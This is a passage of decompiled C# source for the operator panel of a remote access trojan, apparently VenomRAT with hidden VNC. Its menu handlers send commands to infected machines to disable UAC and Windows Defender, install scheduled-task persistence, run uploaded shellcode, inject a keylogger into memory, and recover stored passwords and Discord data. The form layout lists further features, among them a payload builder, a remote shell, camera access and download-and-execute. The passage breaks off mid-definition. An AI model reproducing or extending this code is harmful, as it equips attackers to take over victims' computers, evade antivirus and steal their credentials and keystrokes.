      }
    }

    private void installSchtaskToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "autoschtaskinstall";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        ListViewItem listViewItem1 = new ListViewItem();
        listViewItem1.Text = "InstallSchtask:";
        listViewItem1.SubItems.Add("0");
        listViewItem1.ToolTipText = Guid.NewGuid().ToString();
        if (this.listView44.Items.Count > 0)
        {
          foreach (ListViewItem listViewItem2 in this.listView44.Items)
          {
            if (listViewItem2.Text == listViewItem1.Text)
              return;
          }
        }
        Program.form1.listView44.Items.Add(listViewItem1);
        Program.form1.listView44.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
        Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem1.ToolTipText, false));
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void disableUACToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "disableUAC";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        ListViewItem listViewItem1 = new ListViewItem();
        listViewItem1.Text = "DisableUAC:";
        listViewItem1.SubItems.Add("0");
        listViewItem1.ToolTipText = Guid.NewGuid().ToString();
        if (this.listView44.Items.Count > 0)
        {
          foreach (ListViewItem listViewItem2 in this.listView44.Items)
          {
            if (listViewItem2.Text == listViewItem1.Text)
              return;
          }
        }
        Program.form1.listView44.Items.Add(listViewItem1);
        Program.form1.listView44.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
        Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem1.ToolTipText, true));
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void disableWDToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "disableDefedner";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        ListViewItem listViewItem1 = new ListViewItem();
        listViewItem1.Text = "DisableDefedner:";
        listViewItem1.SubItems.Add("0");
        listViewItem1.ToolTipText = Guid.NewGuid().ToString();
        if (this.listView44.Items.Count > 0)
        {
          foreach (ListViewItem listViewItem2 in this.listView44.Items)
          {
            if (listViewItem2.Text == listViewItem1.Text)
              return;
          }
        }
        Program.form1.listView44.Items.Add(listViewItem1);
        Program.form1.listView44.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
        Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem1.ToolTipText, true));
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void ConnectTimeout_Tick(object sender, EventArgs e)
    {
      Clients[] allClients = this.GetAllClients();
      if (allClients.Length == 0)
        return;
      foreach (Clients clients in allClients)
      {
        if (Methods.DiffSeconds(clients.LastPing, DateTime.Now) > 20.0)
          clients.Disconnected();
      }
    }

    private void remoteRegeditToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Regedit.dll");
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          if ((FormRegistryEditor) Application.OpenForms["remoteRegedit:" + selectedClient.ID] == null)
          {
            FormRegistryEditor formRegistryEditor = new FormRegistryEditor();
            formRegistryEditor.Name = "remoteRegedit:" + selectedClient.ID;
            formRegistryEditor.Text = "remoteRegedit:" + selectedClient.ID;
            formRegistryEditor.ParentClient = selectedClient;
            formRegistryEditor.F = this;
            formRegistryEditor.Show();
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack.Encode2Bytes());
          }
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void normalInstallToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.listView1.SelectedItems.Count <= 0)
        return;
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "normalinstall";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void normalUninstallToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.listView1.SelectedItems.Count <= 0)
        return;
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "normaluninstall";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void justForFunToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Fun.dll");
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          if ((FormFun) Application.OpenForms["fun:" + selectedClient.ID] == null)
          {
            FormFun formFun = new FormFun();
            formFun.Name = "fun:" + selectedClient.ID;
            formFun.Text = "fun:" + selectedClient.ID;
            formFun.F = this;
            formFun.ParentClient = selectedClient;
            formFun.Show();
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack.Encode2Bytes());
          }
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void runShellcodeToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        using (OpenFileDialog openFileDialog = new OpenFileDialog())
        {
          openFileDialog.Multiselect = false;
          openFileDialog.Filter = "(*.bin)|*.bin";
          if (openFileDialog.ShowDialog() != DialogResult.OK)
            return;
          MsgPack msgPack1 = new MsgPack();
          msgPack1.ForcePathObject("Pac_ket").AsString = "Shellcode";
          msgPack1.ForcePathObject("Bin").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
          MsgPack msgPack2 = new MsgPack();
          msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
          msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
          msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
          foreach (Clients selectedClient in this.GetSelectedClients())
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void splitContainer1_Panel2_Paint(object sender, PaintEventArgs e)
    {
    }

    private void menuStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
    {
    }

    private void ListView1_ColumnClick(object sender, DataGridViewCellEventArgs e)
    {
    }

    private void guna2ImageCheckBox1_CheckedChanged(object sender, EventArgs e)
    {
    }

    private void offlineKeyloggerToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "sendMemory";
        msgPack1.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\Keylogger.exe")));
        msgPack1.ForcePathObject("Inject").AsString = "";
        ListViewItem listViewItem1 = new ListViewItem();
        listViewItem1.Text = "Auto Keylogger:";
        listViewItem1.SubItems.Add("0");
        listViewItem1.ToolTipText = Guid.NewGuid().ToString();
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        if (this.listView44.Items.Count > 0)
        {
          foreach (ListViewItem listViewItem2 in this.listView44.Items)
          {
            if (listViewItem2.Text == listViewItem1.Text)
              return;
          }
        }
        Program.form1.listView44.Items.Add(listViewItem1);
        Program.form1.listView44.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
        Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem1.ToolTipText, false));
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void statusStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
    {
    }

    private void toolStripStatusLabel1_Click(object sender, EventArgs e)
    {
    }

    private void ProgramNotificationToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void toolStripMenuItem3_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Logger.dll");
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          if ((FormKeylogger) Application.OpenForms["keyLogger:" + selectedClient.ID] == null)
          {
            FormKeylogger formKeylogger = new FormKeylogger();
            formKeylogger.Name = "keyLogger:" + selectedClient.ID;
            formKeylogger.Text = "keyLogger:" + selectedClient.ID;
            formKeylogger.F = this;
            formKeylogger.FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", selectedClient.ID, "Keylogger");
            formKeylogger.Show();
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack.Encode2Bytes());
          }
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void toolStripMenuItem4_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "sendMemory";
        msgPack1.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\Keylogger.exe")));
        msgPack1.ForcePathObject("Inject").AsString = "";
        ListViewItem listViewItem1 = new ListViewItem();
        listViewItem1.Text = "Auto Keylogger:";
        listViewItem1.SubItems.Add("0");
        listViewItem1.ToolTipText = Guid.NewGuid().ToString();
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        if (this.listView44.Items.Count > 0)
        {
          foreach (ListViewItem listViewItem2 in this.listView44.Items)
          {
            if (listViewItem2.Text == listViewItem1.Text)
              return;
          }
        }
        Program.form1.listView44.Items.Add(listViewItem1);
        Program.form1.listView44.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
        Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem1.ToolTipText, false));
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void toolStripMenuItem5_Click(object sender, EventArgs e)
    {
      try
      {
        Clients[] selectedClients = this.GetSelectedClients();
        if (selectedClients.Length == 0)
        {
          Process.Start(Application.StartupPath);
        }
        else
        {
          foreach (Clients clients in selectedClients)
          {
            string str = Path.Combine(Application.StartupPath, "ClientsFolder\\" + clients.ID);
            if (Directory.Exists(str))
              Process.Start(str);
          }
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void builderToolStripMenuItem1_Click_1(object sender, EventArgs e) => new FormBuilder().Show();

    private void test5ToolStripMenuItem_Click(object sender, EventArgs e) => new FormBuilder().Show();

    private void passwordRecoveryToolStripMenuItem_Click_1(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Recovery.dll");
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack.Encode2Bytes());
        new HandleLogs().Addmsg("Recovering...", Color.Black);
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void coomingSoonToolStripMenuItem_Click(object sender, EventArgs e) => new FrmMain(Convert.ToInt32(VenomRAT_HVNC.Server.Properties.Settings.Default.SavedPort) - 1).Show();

    private void moveToHVNCToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        using (OpenFileDialog openFileDialog = new OpenFileDialog())
        {
          if (openFileDialog.ShowDialog() != DialogResult.OK)
            return;
          MsgPack msgPack1 = new MsgPack();
          msgPack1.ForcePathObject("Pac_ket").AsString = "sendFile";
          msgPack1.ForcePathObject("Update").AsString = "false";
          msgPack1.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
          msgPack1.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
          MsgPack msgPack2 = new MsgPack();
          msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
          msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
          msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
          ListViewItem listViewItem1 = new ListViewItem();
          listViewItem1.Text = "SendFile: " + Path.GetFileName(openFileDialog.FileName);
          listViewItem1.SubItems.Add("0");
          listViewItem1.ToolTipText = Guid.NewGuid().ToString();
          if (this.listView44.Items.Count > 0)
          {
            foreach (ListViewItem listViewItem2 in this.listView44.Items)
            {
              if (listViewItem2.Text == listViewItem1.Text)
                return;
            }
          }
          Program.form1.listView44.Items.Add(listViewItem1);
          Program.form1.listView44.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
          Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem1.ToolTipText, false));
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void DiscordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Discord.dll");
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack.Encode2Bytes());
        new HandleLogs().Addmsg("Recovering Discord...", Color.Black);
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void listView1_SelectedIndexChanged(object sender, EventArgs e) => throw new NotImplementedException();

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.toolStripMenuItem1 = new ToolStripMenuItem();
      this.tabControl122 = new TabControl();
      this.tabPage33 = new TabPage();
      this.listView33 = new ListView();
      this.contextMenuThumbnail = new ContextMenuStrip(this.components);
      this.sTARTToolStripMenuItem = new ToolStripMenuItem();
      this.sTOPToolStripMenuItem = new ToolStripMenuItem();
      this.ThumbnailImageList = new ImageList(this.components);
      this.tabPage44 = new TabPage();
      this.listView44 = new ListView();
      this.columnHeader4 = new ColumnHeader();
      this.columnHeader5 = new ColumnHeader();
      this.contextMenuTasks = new ContextMenuStrip(this.components);
      this.sendFileFromUrlToolStripMenuItem = new ToolStripMenuItem();
      this.downloadAndExecuteToolStripMenuItem = new ToolStripMenuItem();
      this.sENDFILETOMEMORYToolStripMenuItem1 = new ToolStripMenuItem();
      this.disableUACToolStripMenuItem1 = new ToolStripMenuItem();
      this.disableWDToolStripMenuItem1 = new ToolStripMenuItem();
      this.installSchtaskToolStripMenuItem = new ToolStripMenuItem();
      this.uPDATEToolStripMenuItem1 = new ToolStripMenuItem();
      this.autoKeyloggerToolStripMenuItem = new ToolStripMenuItem();
      this.fakeBinderToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator4 = new ToolStripSeparator();
      this.dELETETASKToolStripMenuItem = new ToolStripMenuItem();
      this.tabPage11 = new TabPage();
      this.guna2DragControl1 = new Guna2DragControl(this.components);
      this.guna2Panel1 = new Guna2Panel();
      this.guna2Separator1 = new Guna2Separator();
      this.guna2Separator4 = new Guna2Separator();
      this.guna2Separator2 = new Guna2Separator();
      this.guna2ControlBox2 = new Guna2ControlBox();
      this.guna2ControlBox1 = new Guna2ControlBox();
      this.label3 = new Label();
      this.label2 = new Label();
      this.label1 = new Label();
      this.pictureBox1 = new PictureBox();
      this.FileToolStripMenuItem = new ToolStripMenuItem();
      this.BuilderToolStripMenuItem = new ToolStripMenuItem();
      this.BlockToolStripMenuItem = new ToolStripMenuItem();
      this.SettingToolStripMenuItem = new ToolStripMenuItem();
      this.ExitToolStripMenuItem = new ToolStripMenuItem();
      this.HelpToolStripMenuItem = new ToolStripMenuItem();
      this.DocumentToolStripMenuItem = new ToolStripMenuItem();
      this.AboutToolStripMenuItem = new ToolStripMenuItem();
      this.menuStrip1 = new MenuStrip();
      this.ConnectTimeout = new System.Windows.Forms.Timer(this.components);
      this.TimerTask = new System.Windows.Forms.Timer(this.components);
      this.notifyIcon1 = new NotifyIcon(this.components);
      this.performanceCounter2 = new PerformanceCounter();
      this.performanceCounter1 = new PerformanceCounter();
      this.cLEARToolStripMenuItem = new ToolStripMenuItem();
      this.contextMenuLogs = new ContextMenuStrip(this.components);
      this.UpdateUI = new System.Windows.Forms.Timer(this.components);
      this.ping = new System.Windows.Forms.Timer(this.components);
      this.SystemControlToolStripMenuItem = new ToolStripMenuItem();
      this.ClientControlToolStripMenuItem = new ToolStripMenuItem();
      this.UninstallToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator23 = new ToolStripSeparator();
      this.StopToolStripMenuItem1 = new ToolStripMenuItem();
      this.toolStripSeparator24 = new ToolStripSeparator();
      this.RestartToolStripMenuItem1 = new ToolStripMenuItem();
      this.toolStripSeparator25 = new ToolStripSeparator();
      this.UpdateToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator13 = new ToolStripSeparator();
      this.SystemToolStripMenuItem = new ToolStripMenuItem();
      this.LogoutToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator14 = new ToolStripSeparator();
      this.RebootToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator15 = new ToolStripSeparator();
      this.ShutDownToolStripMenuItem = new ToolStripMenuItem();
      this.RemoteManagerToolStripMenuItem = new ToolStripMenuItem();
      this.RemoteShellToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator16 = new ToolStripSeparator();
      this.RemoteScreenToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator17 = new ToolStripSeparator();
      this.RemoteCameraToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator18 = new ToolStripSeparator();
      this.FileManagerToolStripMenuItem1 = new ToolStripMenuItem();
      this.toolStripSeparator19 = new ToolStripSeparator();
      this.remoteRegeditToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator20 = new ToolStripSeparator();
      this.ProcessManagerToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator21 = new ToolStripSeparator();
      this.netstatToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator22 = new ToolStripSeparator();
      this.RecordToolStripMenuItem = new ToolStripMenuItem();
      this.RemoteControlToolStripMenuItem = new ToolStripMenuItem();
      this.SendFileToolStripMenuItem1 = new ToolStripMenuItem();
      this.SendFileToMemoryToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator26 = new ToolStripSeparator();
      this.SendFileToDiskToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator27 = new ToolStripSeparator();
      this.fromUrlToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator28 = new ToolStripSeparator();
      this.VisteWebsiteToolStripMenuItem1 = new ToolStripMenuItem();
      this.toolStripSeparator29 = new ToolStripSeparator();
      this.runShellcodeToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator30 = new ToolStripSeparator();
      this.ChangeWallpaperToolStripMenuItem1 = new ToolStripMenuItem();
      this.toolStripSeparator31 = new ToolStripSeparator();
      this.FileSearchToolStripMenuItem = new ToolStripMenuItem();
      this.MalwareToolStripMenuItem = new ToolStripMenuItem();
      this.DisableWDToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator32 = new ToolStripSeparator();
      this.DisableUACToolStripMenuItem = new ToolStripMenuItem();
      this.BypassUACAToolStripMenuItem = new ToolStripMenuItem();
      this.SilentCleanupToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator33 = new ToolStripSeparator();
      this.RunasToolStripMenuItem = new ToolStripMenuItem();
      this.hVNCToolStripMenuItem = new ToolStripMenuItem();
      this.coomingSoonToolStripMenuItem = new ToolStripMenuItem();
      this.moveToHVNCToolStripMenuItem = new ToolStripMenuItem();
      this.InstallToolStripMenuItem = new ToolStripMenuItem();
      this.SchtaskInstallToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator34 = new ToolStripSeparator();
      this.SchtaskUninstallToolStripMenuItem = new ToolStripMenuItem();
      this.InformationToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripMenuItem2 = new ToolStripMenuItem();
      this.passwordRecoveryToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator35 = new ToolStripSeparator();
      this.toolStripMenuItem3 = new ToolStripMenuItem();
      this.toolStripSeparator36 = new ToolStripSeparator();
      this.toolStripMenuItem4 = new ToolStripMenuItem();
      this.toolStripMenuItem5 = new ToolStripMenuItem();
      this.contextMenuClient = new ContextMenuStrip(this.components);
      this.builderToolStripMenuItem1 = new ToolStripMenuItem();
      this.toolStripSeparator1 = new ToolStripSeparator();
      this.toolStripSeparator2 = new ToolStripSeparator();
      this.toolStripSeparator3 = new ToolStripSeparator();
      this.toolStripSeparator5 = new ToolStripSeparator();
      this.toolStripSeparator6 = new ToolStripSeparator();
      this.toolStripSeparator7 = new ToolStripSeparator();
      this.toolStripSeparator8 = new ToolStripSeparator();
      this.toolStripSeparator9 = new ToolStripSeparator();
      this.discordToolStripMenuItem = new ToolStripMenuItem();
      this.DiscordRecoveryToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator37 = new ToolStripSeparator();
      this.toolStripSeparator10 = new ToolStripSeparator();
      this.justForFunToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator11 = new ToolStripSeparator();
      this.toolStripSeparator12 = new ToolStripSeparator();
      this.panel2 = new Panel();
      this.guna2ResizeBox1 = new Guna2ResizeBox();
      this.statusStrip1 = new StatusStrip();
      this.toolStripStatusLabel1 = new ToolStripStatusLabel();
      this.toolStripStatusLabel2 = new ToolStripStatusLabel();
      this.listView1 = new ListView();
      this.lv_ip = new ColumnHeader();
      this.lv_country = new ColumnHeader();
      this.lv_group = new ColumnHeader();
      this.lv_hwid = new ColumnHeader();
      this.lv_user = new ColumnHeader();
      this.lv_camera = new ColumnHeader();
      this.lv_os = new ColumnHeader();
      this.lv_version = new ColumnHeader();
      this.lv_ins = new ColumnHeader();
      this.lv_admin = new ColumnHeader();
      this.lv_av = new ColumnHeader();
      this.lv_ping = new ColumnHeader();
      this.lv_act = new ColumnHeader();
      this.columnHeader1 = new ColumnHeader();
      this.guna2BorderlessForm1 = new Guna2BorderlessForm(this.components);
      this.tabControl122.SuspendLayout();
      this.tabPage33.SuspendLayout();
      this.contextMenuThumbnail.SuspendLayout();
      this.tabPage44.SuspendLayout();
      this.contextMenuTasks.SuspendLayout();
      ((Control) this.guna2Panel1).SuspendLayout();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      this.menuStrip1.SuspendLayout();
      this.performanceCounter2.BeginInit();
      this.performanceCounter1.BeginInit();
      this.contextMenuLogs.SuspendLayout();
      this.contextMenuClient.SuspendLayout();
      this.panel2.SuspendLayout();
      this.statusStrip1.SuspendLayout();
      this.SuspendLayout();
      this.toolStripMenuItem1.Name = "toolStripMenuItem1";
      this.toolStripMenuItem1.Size = new Size(188, 30);
      this.toolStripMenuItem1.Text = "Online Keylogger";
      this.tabControl122.Controls.Add((Control) this.tabPage33);
      this.tabControl122.Controls.Add((Control) this.tabPage44);
      this.tabControl122.Controls.Add((Control) this.tabPage11);
      this.tabControl122.Location = new Point(662, 310);
      this.tabControl122.Margin = new Padding(2);
      this.tabControl122.Name = "tabControl122";
      this.tabControl122.SelectedIndex = 0;
      this.tabControl122.Size = new Size(510, 135);
      this.tabControl122.SizeMode = TabSizeMode.Fixed;
      this.tabControl122.TabIndex = 3;
      this.tabPage33.Controls.Add((Control) this.listView33);
      this.tabPage33.Location = new Point(4, 22);
      this.tabPage33.Margin = new Padding(2);
      this.tabPage33.Name = "tabPage33";
      this.tabPage33.Size = new Size(502, 109);
      this.tabPage33.TabIndex = 2;
      this.tabPage33.Text = "Screens1";
      this.tabPage33.UseVisualStyleBackColor = true;
      this.listView33.ContextMenuStrip = this.contextMenuThumbnail;
      this.listView33.Dock = DockStyle.Fill;
      this.listView33.HideSelection = false;
      this.listView33.LargeImageList = this.ThumbnailImageList;
      this.listView33.Location = new Point(0, 0);
      this.listView33.Margin = new Padding(2);
      this.listView33.Name = "listView33";
      this.listView33.ShowItemToolTips = true;
      this.listView33.Size = new Size(502, 109);
      this.listView33.SmallImageList = this.ThumbnailImageList;
      this.listView33.TabIndex = 0;
      this.listView33.UseCompatibleStateImageBehavior = false;
      this.contextMenuThumbnail.ImageScalingSize = new Size(24, 24);
      this.contextMenuThumbnail.Items.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.sTARTToolStripMenuItem,
        (ToolStripItem) this.sTOPToolStripMenuItem
      });
      this.contextMenuThumbnail.Name = "contextMenuStrip2";
      this.contextMenuThumbnail.Size = new Size(99, 48);
      this.sTARTToolStripMenuItem.ForeColor = SystemColors.ControlText;
      this.sTARTToolStripMenuItem.Name = "sTARTToolStripMenuItem";
      this.sTARTToolStripMenuItem.Size = new Size(98, 22);
      this.sTARTToolStripMenuItem.Text = "Start";
      this.sTARTToolStripMenuItem.Click += new EventHandler(this.STARTToolStripMenuItem_Click);
      this.sTOPToolStripMenuItem.Name = "sTOPToolStripMenuItem";
      this.sTOPToolStripMenuItem.Size = new Size(98, 22);
      this.sTOPToolStripMenuItem.Text = "Stop";
      this.sTOPToolStripMenuItem.Click += new EventHandler(this.STOPToolStripMenuItem_Click);
      this.ThumbnailImageList.ColorDepth = ColorDepth.Depth16Bit;
      this.ThumbnailImageList.ImageSize = new Size(256, 256);
      this.ThumbnailImageList.TransparentColor = Color.Transparent;
      this.tabPage44.Controls.Add((Control) this.listView44);
      this.tabPage44.Location = new Point(4, 22);
      this.tabPage44.Margin = new Padding(2);
      this.tabPage44.Name = "tabPage44";
      this.tabPage44.Padding = new Padding(2);
      this.tabPage44.Size = new Size(502, 109);
      this.tabPage44.TabIndex = 3;
      this.tabPage44.Text = "Auto Task4";
      this.tabPage44.UseVisualStyleBackColor = true;
      this.listView44.BorderStyle = BorderStyle.None;
      this.listView44.Columns.AddRange(new ColumnHeader[2]
      {
        this.columnHeader4,
        this.columnHeader5
      });
      this.listView44.ContextMenuStrip = this.contextMenuTasks;
      this.listView44.Dock = DockStyle.Fill;
      this.listView44.FullRowSelect = true;
      this.listView44.HideSelection = false;
      this.listView44.Location = new Point(2, 2);
      this.listView44.Margin = new Padding(2);
      this.listView44.Name = "listView44";
      this.listView44.Size = new Size(498, 105);
      this.listView44.TabIndex = 0;
      this.listView44.UseCompatibleStateImageBehavior = false;
      this.listView44.View = View.Details;
      this.columnHeader4.Text = "Task";
      this.columnHeader4.Width = 97;
      this.columnHeader5.Text = "Run times";
      this.columnHeader5.Width = 116;
      this.contextMenuTasks.ImageScalingSize = new Size(24, 24);
      this.contextMenuTasks.Items.AddRange(new ToolStripItem[11]
      {
